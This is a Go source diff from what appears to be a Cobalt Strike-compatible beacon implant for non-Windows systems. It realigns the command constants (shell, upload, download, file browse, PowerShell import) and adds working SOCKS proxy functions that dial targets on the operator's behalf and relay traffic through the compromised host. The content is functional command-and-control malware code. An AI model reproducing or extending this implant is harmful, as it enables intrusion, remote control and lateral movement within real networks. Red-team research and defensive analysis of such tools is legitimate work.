@@ -25,75 +25,78 @@ import (
 )
 
 const (
-	CMD_TYPE_SPAWN					= 1		// TODO
+	CMD_TYPE_SPAWN				= 1		// TODO
 	CMD_TYPE_EXIT        		= 3		// IMPLEMENTED
-	CMD_TYPE_SLEEP        	= 4		// IMPLEMENTED 
-	CMD_TYPE_CD           	= 5		// IMPLEMENTED
-	CMD_TYPE_DATA_JITTER  	= 6		// TODO
+	CMD_TYPE_SLEEP        		= 4		// IMPLEMENTED 
+	CMD_TYPE_CD           		= 5		// IMPLEMENTED
+	CMD_TYPE_DATA_JITTER  		= 6		// TODO
 	CMD_TYPE_CHECKIN	  		= 8		// WONTFIX: only required for DNS beacons
 	CMD_TYPE_DLL_INJECT			= 9		// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
-	CMD_TYPE_UPLOAD_START 	= 10	// IMPLEMENTED
-	CMD_TYPE_DOWNLOAD     	= 11	// IMPLEMENTED
-	CMD_TYPE_PIPE_FWD				= 22 	// IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
+	CMD_TYPE_UPLOAD_START 		= 10	// IMPLEMENTED
+	CMD_TYPE_DOWNLOAD     		= 11	// IMPLEMENTED
+	CMD_TYPE_SOCKS_FWD			= 14	// TBD
+	CMD_TYPE_SOCKS_SEND			= 15	// TBD
+	CMD_TYPE_SOCKS_DIE			= 16	// TBD
+	CMD_TYPE_PIPE_FWD			= 22 	// IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
 	CMD_TYPE_GETUID		  		= 27	// IMPLEMENTED
-	CMD_TYPE_LIST_PROCESS 	= 32	// IMPLEMENTED
+	CMD_TYPE_LIST_PROCESS 		= 32	// IMPLEMENTED
 	CMD_TYPE_PWSH_IMPORT		= 37  // IMPLEMENTED
-	CMD_TYPE_RUNAS					= 38	// TODO
-	CMD_TYPE_PWD          	= 39	// IMPLEMENTED
-	CMD_TYPE_JOB_KILL				= 42	// TODO: requires job control to be implemented
-	CMD_TYPE_DLL_INJECT_64	= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
-	CMD_TYPE_SPAWN_64				= 44	// TODO
-	CMD_TYPE_IP_CONFIG	  	= 48	// TODO
+	CMD_TYPE_RUNAS				= 38	// TODO
+	CMD_TYPE_PWD          		= 39	// IMPLEMENTED
+	CMD_TYPE_JOB_KILL			= 42	// TODO: requires job control to be implemented
+	CMD_TYPE_DLL_INJECT_64		= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
+	CMD_TYPE_SPAWN_64			= 44	// TODO
+	CMD_TYPE_IP_CONFIG	  		= 48	// TODO
 	CMD_TYPE_LOGIN_USER			= 49	// WONTFIX: ticket forging is not a thing in UNIX afaik
-	CMD_TYPE_PORT_FWD				= 50 	// TODO
-	CMD_TYPE_PORT_FWD_STOP	= 51	// TODO
-	CMD_TYPE_FILE_BROWSE  	= 53	// IMPLEMENTED
+	CMD_TYPE_PORT_FWD			= 50 	// TODO
+	CMD_TYPE_PORT_FWD_STOP		= 51	// TODO
+	CMD_TYPE_FILE_BROWSE  		= 53	// IMPLEMENTED
 	CMD_TYPE_DRIVES		  		= 55	// IMPLEMENTED
-	CMD_TYPE_RM			  			= 56	// IMPLEMENTED
-	CMD_TYPE_UPLOAD_LOOP  	= 67	// IMPLEMENTED
-	CMD_TYPE_LINK_EXPLICIT	= 68	// TBD, SMB communication if possible
-	CMD_TYPE_CP			  			= 73	// IMPLEMENTED
-	CMD_TYPE_MV			  			= 74	// IMPLEMENTED
+	CMD_TYPE_RM			  		= 56	// IMPLEMENTED
+	CMD_TYPE_UPLOAD_LOOP  		= 67	// IMPLEMENTED
+	CMD_TYPE_LINK_EXPLICIT		= 68	// TBD, SMB communication if possible
+	CMD_TYPE_CP			  		= 73	// IMPLEMENTED
+	CMD_TYPE_MV			  		= 74	// IMPLEMENTED
 	CMD_TYPE_RUN_UNDER			= 76	// TBD, injection into UNIX processes might be out of scope of this project
-	CMD_TYPE_GET_PRIVS	  	= 77	// TODO
-	CMD_TYPE_SHELL        	= 78	// IMPLEMENTED
-	CMD_TYPE_HOST_PWSH_IMP	= 79 	// sends the port number where the file set by powershell-import should be hosted locally
-	CMD_TYPE_LOAD_DLL				= 80	// WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
+	CMD_TYPE_GET_PRIVS	  		= 77	// TODO
+	CMD_TYPE_SHELL        		= 78	// IMPLEMENTED
+	CMD_TYPE_HOST_PWSH_IMP		= 79 	// sends the port number where the file set by powershell-import should be hosted locally
+	CMD_TYPE_LOAD_DLL			= 80	// WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
 	CMD_TYPE_REG_QUERY			= 81	// WONTFIX: No Registry on UNIX
 	CMD_TYPE_PIVOT_LISTEN		= 82	// TBD
 	CMD_TYPE_CONNECT	  		= 86	// IMPLEMENTED
 	CMD_TYPE_INLINE_EXEC		= 95	// WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
-	// CMD_TYPE_DISCONNECT	  = ??
+	// CMD_TYPE_DISCONNECT	  	= ??
 
 	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
 	BEACON_RSP_DOWNLOAD_START	        = 2
 	BEACON_RSP_OUTPUT_SCREENSHOT	    = 3
 	BEACON_RSP_SOCKS_DIE	            = 4
-	BEACON_RSP_SOCKS_WRITE	          = 5
+	BEACON_RSP_SOCKS_WRITE	         	= 5
 	BEACON_RSP_SOCKS_RESUME	        	= 6
 	BEACON_RSP_SOCKS_PORTFWD	        = 7
 	BEACON_RSP_DOWNLOAD_WRITE	        = 8
 	BEACON_RSP_DOWNLOAD_COMPLETE	    = 9
-	BEACON_RSP_BEACON_LINK	          = 10
+	BEACON_RSP_BEACON_LINK	          	= 10
 	BEACON_RSP_DEAD_PIPE	            = 11
 	BEACON_RSP_BEACON_CHECKIN	        = 12
 	BEACON_RSP_BEACON_POST_ERROR	  	= 13
-	BEACON_RSP_PIPES_PING		        	= 14
-	BEACON_RSP_BEACON_IMPERSONATED	  = 15
+	BEACON_RSP_PIPES_PING		       	= 14
+	BEACON_RSP_BEACON_IMPERSONATED	  	= 15
 	BEACON_RSP_BEACON_GETUID	        = 16
 	BEACON_RSP_BEACON_OUTPUT_PS	    	= 17
 	BEACON_RSP_ERROR_CLOCK_SKEW	    	= 18
 	BEACON_RSP_BEACON_GETCWD	        = 19
 	BEACON_RSP_BEACON_OUTPUT_JOBS	    = 20
 	BEACON_RSP_BEACON_OUTPUT_HASHES		= 21
-	BEACON_RSP_FILE_BROWSE_RESULT     = 22
+	BEACON_RSP_FILE_BROWSE_RESULT     	= 22
 	BEACON_RSP_SOCKS_ACCEPT	        	= 23
 	BEACON_RSP_BEACON_OUTPUT_NET	    = 24
 	BEACON_RSP_BEACON_OUTPUT_PORTSCAN	= 25
-	BEACON_RSP_BEACON_EXIT	          = 26
+	BEACON_RSP_BEACON_EXIT	          	= 26
 	BEACON_RSP_OUTPUT	                = 30
-	BEACON_RSP_BEACON_ERROR						= 31
-	BEACON_RSP_OUTPUT_UTF8						= 32
+	BEACON_RSP_BEACON_ERROR				= 31
+	BEACON_RSP_OUTPUT_UTF8				= 32
 )
 
 var (
@@ -530,6 +533,121 @@ func ParsePipeForward(b []byte) (uint32, []byte) {
 
 	// return addr, port
 	return beaconId, cmdBuf
+}
+
+func ParseSocksInitTraffic(b []byte) []byte {
+	// traffic consists of 4 bytes of what I assume is a client identifier, 2 bytes for the destination port, and 8 bytes for an address.
+	// Implementation plan would be to create a list of socks sessions, put each in a go subroutine and collect all output on every execution loop somehow.
+	// TODO: determine how the format changes if SOCKS4a is used to send an address instead of an IP address
+	// reference for socks4a implementation: https://github.com/henkman/socks4a/blob/master/socks4a.go
+	buf := bytes.NewBuffer(b)
+
+	clientIdBuf := make([]byte, 4)
+	_, err := buf.Read(clientIdBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	}
+	clientId := ReadInt(clientIdBuf)
+
+	fmt.Printf("ClientId is: %d\n", clientId)
+
+	// if client identifier is exists in our list, write to created session, else create a new session for the provided port and address?
+	portBuf := make([]byte, 2)
+	_, err = buf.Read(portBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	}
+	port := ReadShort(portBuf)
+	fmt.Printf("Port is: %d\n", port)
+
+	addrBuf := make([]byte, len(b[6:]))
+	_, err = buf.Read(addrBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		return nil
+	}
+	origAddr := string(addrBuf)
+	fmt.Printf("Address is: %s\n", origAddr)
+
+	addr, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", origAddr, port))
+	if err != nil {
+		fmt.Printf("ERROR RESOLVING ADDR: %s\n", err.Error())
+		processErrorTest(68, 0, 0, fmt.Sprintf("%s:%d", addr.IP, addr.Port))
+		return nil
+	}
+
+	conn , err := net.DialTCP("tcp", nil, addr)
+	if err != nil {
+		fmt.Printf("ERROR DIALING ADDR: %s\n", err.Error())
+		processErrorTest(68, 0, 0, fmt.Sprintf("%s:%d", addr.IP, addr.Port))
+		return nil
+	}
+	sess := &config.SocksSession{int(clientId), origAddr, int(port), conn, nil}
+	config.SocksSessions = append(config.SocksSessions, sess)
+	go SocksResListen(sess)
+
+
+	fmt.Printf("Client %d wants to send data to %s:%d\n", clientId, addr, port)
+	// return MakePacket(BEACON_RSP_SOCKS_ACCEPT, append(WriteLittleInt(1337), clientIdBuf...))
+	return MakePacket(BEACON_RSP_SOCKS_RESUME, WriteInt(int(clientId)))
+}
+
+func ParseSocksTraffic(b []byte) {
+	// check if the client id is present in any of our current socks session, else send an error
+	// if present, just raw dump the traffic into the socket we have open, and send back the response
+	// as the response might take some time, we will put this into a go subroutine, and check if there is something to report on every tick of the beacon
+	buf := bytes.NewBuffer(b)
+
+	clientIdBuf := make([]byte, 4)
+	_, err := buf.Read(clientIdBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+	} else {
+		clientId := ReadInt(clientIdBuf)
+
+		trafficBuf := make([]byte, len(b[4:]))
+		_, err = buf.Read(trafficBuf)
+		if err != nil {
+			processErrorTest(0, 0, 0, err.Error())
+		} else {
+			for i := range config.SocksSessions {
+				if config.SocksSessions[i].Id == int(clientId) {
+					// Found!
+					// we only send data, reading a response will happen the next time we check in with that beacon either way
+					fmt.Printf("Creating new thread to send data in background\n")
+					go SocksSendReq(config.SocksSessions[i], trafficBuf)
+				}
+			}
+		}
+	}
+}
+
+func ParseSocksDie(b []byte) []byte {
+	buf := bytes.NewBuffer(b)
+
+	clientIdBuf := make([]byte, 4)
+	_, err := buf.Read(clientIdBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+	} else {
+		clientId := ReadInt(clientIdBuf)
+		fmt.Printf("Killing SOCKS session for client id %d\n", clientId)
+		for i := range config.SocksSessions {
+			if config.SocksSessions[i].Id == int(clientId) {
+				// Found!
+				// close connection
+				config.SocksSessions[i].Conn.Close()
+				// reslicing to remove closed connection
+				config.SocksSessions[i] = config.SocksSessions[len(config.SocksSessions)-1]
+    			config.SocksSessions = config.SocksSessions[:len(config.SocksSessions)-1]
+				result := MakePacket(BEACON_RSP_SOCKS_DIE, WriteInt(int(clientId)))
+				return result
+			}
+		}
+	}
+	return nil
 }
 
 func File_Browse(b []byte) []byte {
